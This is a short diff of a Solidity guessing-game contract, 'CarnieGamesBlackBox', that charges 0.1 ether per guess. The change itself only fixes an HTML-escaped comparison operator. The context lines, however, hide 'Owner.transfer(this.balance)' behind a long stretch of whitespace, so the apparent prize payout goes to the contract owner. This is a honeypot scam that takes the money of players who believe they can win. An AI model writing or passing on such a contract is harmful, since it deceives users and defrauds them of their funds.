@@ -15,7 +15,7 @@ contract CarnieGamesBlackBox
     public
     payable
     {                                                                    
-        if(msg.value &gt;= .1 ether)
+        if(msg.value >= .1 ether)
         {
             if(keccak256(guess) == key)
             {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
